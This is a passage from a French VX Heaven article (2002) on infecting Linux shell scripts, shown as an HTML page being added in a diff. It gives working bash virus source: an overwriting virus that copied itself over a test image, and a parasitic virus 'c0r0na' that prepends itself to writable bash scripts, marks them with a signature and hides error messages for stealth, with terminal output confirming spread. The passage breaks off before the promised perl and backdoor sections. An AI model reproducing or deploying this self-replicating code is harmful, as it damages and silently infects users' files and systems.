@@ -1,0 +1,535 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Emper0r 'Shell script &amp; perl script infection' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Emper0r"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Emper0r,Shell script &amp;amp; perl script infection, emper, test, perl, fichier, temp, désinfection, file, rwxr, backdoor, script, print, bash, elle, partie, null"/>
+<meta name="Description" content="Les virus aux pays des pingouins ont la vie dure. Premièrement n'importe qui n'infecte pas n'importe quoi n'importe où. L'infection des elf est une chose délicate, donc le mieux pour s'amuser est d'étudier l'infection des scripts. Cet article n'a pas pour but d'inciter les S-K à polluer les systèmes linux, mais sert à présenter un danger potentiel. Ce danger est relativement faible vu la facilité de détecter ce genre de bestiole  et vu la difficulté que ces virus rencontre pour ce propager."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c2e079d0204388047643ca51b2e611ebea29c0c8-1498757922-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vem01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Shell script &amp; perl script infection</h1><p><a href="/lib/?lang=fr&amp;author=Emper0r"> Emper0r</a><br/> <em> 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vem01.html';</script>[<a style="" href="/lib/?lang=FR&amp;index=MA#vem01">Back to index</a>] [<a href="/lib/vem01.html#disqus_thread">Comments</a>]<br/> 
+ 
+<h2>Introducion</h2>
+<p>Les virus aux pays des pingouins ont la vie dure. Premièrement n'importe qui n'infecte pas n'importe quoi n'importe où. L'infection des elf est une chose délicate, donc le mieux pour s'amuser est d'étudier l'infection des scripts. Cet article n'a pas pour but d'inciter les S-K à polluer les systèmes linux, mais sert à présenter un danger potentiel. Ce danger est relativement faible vu la facilité de détecter ce genre de bestiole et vu la difficulté que ces virus rencontre pour ce propager.</p>
+<p>Notre virus doit infecter un maximum de fichier en respectant des consignes de discrétions.</p>
+<p>Il ne doit pas:</p>
+<ul>
+<li>Créer de messages d'erreur</li>
+<li>Détruire ou abîmer des données</li>
+<li>Ralentir et/ou provoquer un mauvais fonctionnement du système</li>
+<li>Agrandir de façon trop importante les scripts infecté</li>
+</ul>
+<h2>Sommaire</h2>
+<ol type="I">
+<li>Shell script infection.
+<ol type="A">
+<li>Virus à écrasement.</li>
+<li>Virus parasite.</li>
+<li>Optimisation du virus.</li>
+<li>Désinfection.</li>
+</ol></li>
+<li>Perl script infection.
+<ol type="A">
+<li>Virus parasite.</li>
+<li>Backdoor.</li>
+</ol></li>
+<li>Perl-shell script infection.
+<ol type="A">
+<li>Virus parasite à mutation simple.</li>
+</ol></li>
+</ol>
+<h2>Partie 1: Shell script infection</h2>
+<h3>I. Virus à écrasement</h3>
+<p>Je crée un dossier test et dedans j'y place 5 fichiers, 4 fichiers de script et 1 fichier image:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="57323a2732256725173b3627233827">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ls -al
+total 124
+drwxr-xr-x    2 emper0r  emper0r      4096 jun 20 01:16 ./
+drwx--x--x   22 emper0r  emper0r      4096 jun 20 01:15 ../
+-rwxr-xr-x    1 emper0r  emper0r        35 jun 20 01:15 test*
+-rwxr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test1*
+-rwxr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test2*
+-r-xr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test3*
+-rwxr-xr-x    1 emper0r  emper0r     97685 jun 20 01:15 tux.jpg*
+</pre>
+<p>Les fichiers de tests sont identiques mais test3 na pas de droits en écriture. Voici le contenu de ces fichiers:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a9ccc4d9ccdb99dbe9c5c8d9ddc6d9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ cat test
+#!/bin/bash
+echo 'script de test'
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6b0e061b0e195b192b070a1b1f041b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$
+</pre>
+<p>Bon, on va commencer par un petit script de base qui doit ce reproduire dans le répertoire courant. On crée un nouveau script que j'appelle vx:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/bash</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> fichier <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#recherche les fichiers du répertoire</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#courant et place leur nom dans $fichier</span><br/>
+<br/>
+<span style="color: #000000; font-weight: bold;">do</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#début de la boucle</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #007800;">$0</span> <span style="color: #007800;">$fichier</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#copie le contenu du script lancé dans</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#le script trouvé</span><br/>
+<br/>
+<span style="color: #000000; font-weight: bold;">done</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#on recommence tant qu'il y a des fichiers dans</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#le répertoire</span><br/>
+&nbsp;</div>
+<p>W0W alors ça c'est carrément trop l33t comme script!!! Je vais pouvoir écrire pour Hackerz Voice si je continue (humour).</p>
+<p>Je lance ça:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c79716c796e2c6e5c707d6c68736c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ./vx
+cp: Ne peut créer un fichier de type régulier `test3': Permission non accordée
+cp: `./vx' et `vx' identifient le même fichier.
+</pre>
+<p>Pour la discrétion c'est loupé 2 messages d'erreur déjà :)</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="11747c6174632163517d7061657e61">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ls -al
+total 32
+drwxr-xr-x    2 emper0r  emper0r      4096 jun 20 01:24 ./
+drwx--x--x   23 emper0r  emper0r      4096 jun 20 01:24 ../
+-rwxr-xr-x    1 emper0r  emper0r        55 jun 20 01:29 test*
+-rwxr-xr-x    1 emper0r  emper0r        55 jun 20 01:29 test1*
+-rwxr-xr-x    1 emper0r  emper0r        55 jun 20 01:29 test2*
+-r-xr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test3*
+-rwxr-xr-x    1 emper0r  emper0r        55 jun 20 01:29 tux.jpg*
+-rwxr-xr-x    1 emper0r  emper0r        55 jun 20 01:24 vx*
+</pre>
+<p>Ce stupide code a détruit mon image il s'est recopié dedans à sa place; mon image ne fait plus que 55 octets.</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7d2dac7d2c587c5f7dbd6c7c3d8c7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ cat test
+#!/bin/bash
+for fichier in *
+do
+        cp $0 $fichier
+done
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="680d05180d1a581a280409181c0718">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$
+</pre>
+<p>Le contenu de mes scripts à aussi été remplacé par le code du virus. Ce genre de virus est appelé virus a écrasement, vous avez compris pourquoi? :) Ils ne présentent absolument aucun interêt.</p>
+<h3>II. Virus Parasite:</h3>
+<p>Après ce premier test on voit que le virus à crée une erreur en voulant infecter un fichier qui n'a pas de droits en écriture.</p>
+<p>Ici 2 solutions:</p>
+<ul>
+<li>rediriger le messages vers /dev/null</li>
+<li>regarder si l'on est le propriétaire de ce script et dans ce cas ajouter les droits, sinon &gt; /dev/null.</li>
+</ul>
+<p>La 2nd solution n'est pas terrible car elle alourdit un peu le code, et les cas où il ne vas y avoir les droits d'écriture sur le fichier et où on va pouvoir les mettre vont être rares. De toute façon, ce n'est pas très discret, mais à vous de voir ce que vous recherchez.</p>
+<p>Le deuxième messages d'erreur est provoqué par le script lancé qui tente de se récrire lui même ; il suffit de rediriger vers /dev/null et voila c'est réglé.</p>
+<p>Il faut aussi que le virus fasse la différence entre des fichiers de type shell script et les autres, car ajouter un script dans une image ou un elf n'a pas de sens.</p>
+<p>Pour cela on utilise la commande file:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="98fdf5e8fdeaa8ead8f4f9e8ecf7e8">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ file test
+test: Bourne-Again shell script text executable
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ddb8b0adb8afedaf9db1bcada9b2ad">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$
+</pre>
+<p>Dernier point à régler il faut que le virus se recopie dans les autres shell script mais sans les détruire. Il faut faire un truc comme ça:</p>
+<pre>
+ ------- 			         -------
+|       |				| virus	|
+|shell	|    &lt;-- avant			|-------|	&lt;-- après
+|script	|	 infection		|	|	    infection
+|	|				|shell	|
+ ------- 				|script	|
+					|	|
+					 -------
+</pre>
+<p>Voila, on a le code viral au début du script. Une fois qu'il a fini de bosser il passe la main au code du script original. Il faut aussi inclure une signature aux script déjà infectés afin de ne pas les réinfecter plusieurs fois.</p>
+<p>Voici le code, non optimisé, que je propose pour effectuer tout ça:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/bash</span><br/>
+<span style="color: #666666; font-style: italic;">#c0r0na &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #signature</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> fichier <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$fichier</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$fichier</span> <span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#$fichier est un fichier ?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#on peut y écrire dedans ?</span><br/>
+&nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: #007800;">$fichier</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> Bourne-A <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null &nbsp;<span style="color: #666666; font-style: italic;">#teste si le fichier est un</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#script bash</span><br/>
+&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">2</span> <span style="color: #007800;">$fichier</span> &nbsp;<span style="color: #000000; font-weight: bold;">&gt;</span> .a<br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> c0r0na .a <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#teste si le fichier a déjà</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#été infecter</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #660033;">-f</span> .a<br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$fichier</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#sinon</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">23</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$fichier</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#place le code viral dans le fichiers</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> .a <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$fichier</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#remet le script initial à la suite</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #660033;">-f</span> .a<br/>
+&nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>C'est vraiment rien de compliqué.</p>
+<p>Je restore le dossier test précédement sauvegardé et je teste mon nouveau script:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2e4b435e4b5c1e5c6e424f5e5a415e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ls -al
+total 128
+drwxrwxr-x    2 emper0r  emper0r      4096 jun 20 14:59 ./
+drwx--x--x   24 emper0r  emper0r      4096 jun 20 14:59 ../
+-rwxr-xr-x    1 emper0r  emper0r        35 jun 20 01:15 test*
+-rwxr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test1*
+-rwxr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test2*
+-r-xr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test3*
+-rwxr-xr-x    1 emper0r  emper0r     97685 jun 20 01:15 tux.jpg*
+-rwxrwxr-x    1 emper0r  emper0r       441 jun 20 03:15 c0r0na*
+</pre>
+<p>On lance le virus:</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="badfd7cadfc88ac8fad6dbcaced5ca">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ./c0r0na
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="72171f0217004200321e1302061d02">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$
+</pre>
+<p>Aucun message d'erreur c'est déjà ça :)</p>
+<pre>
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="67020a1702155715270b0617130817">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test]$ ls -al
+total 128
+drwxrwxr-x    2 emper0r  emper0r      4096 jun 20 15:03 ./
+drwx--x--x   24 emper0r  emper0r      4096 jun 20 14:59 ../
+-rwxr-xr-x    1 emper0r  emper0r       476 jun 20 15:03 test*
+-rwxr-xr-x    1 emper0r  emper0r       476 jun 20 15:03 test1*
+-rwxr-xr-x    1 emper0r  emper0r       476 jun 20 15:03 test2*
+-r-xr-xr-x    1 emper0r  emper0r        35 jun 20 01:16 test3*
+-rwxr-xr-x    1 emper0r  emper0r     97685 jun 20 01:15 tux.jpg*
+-rwxrwxr-x    1 emper0r  emper0r       441 jun 20 03:15 c0r0na*
+</pre>
+<p>Il a l'air d'avoir bien fait son boulot on remarque l'agrandissement des scripts test ; l'image n'a pas été détruite.</p>
+<p>Si on fait un "cat test", on voit bien notre code viral au début puis après le script original. Maintenant je teste si les scripts infectés peuvent infecter à leur tour d'autre script.</p>
+<p>Je crée un script nommé "test4" et je lance "test" : Tout marche comme prévu, le code viral se lance, infecte le nouveau fichier (test4) et le code original du script est exécuté. Le script na pas ralenti de façon visible le système sur mon laptop équipé d'un duron 900. Pour tester le temps mis a effectuer le script on peut lancer le script de cette façon</p>
+<pre>
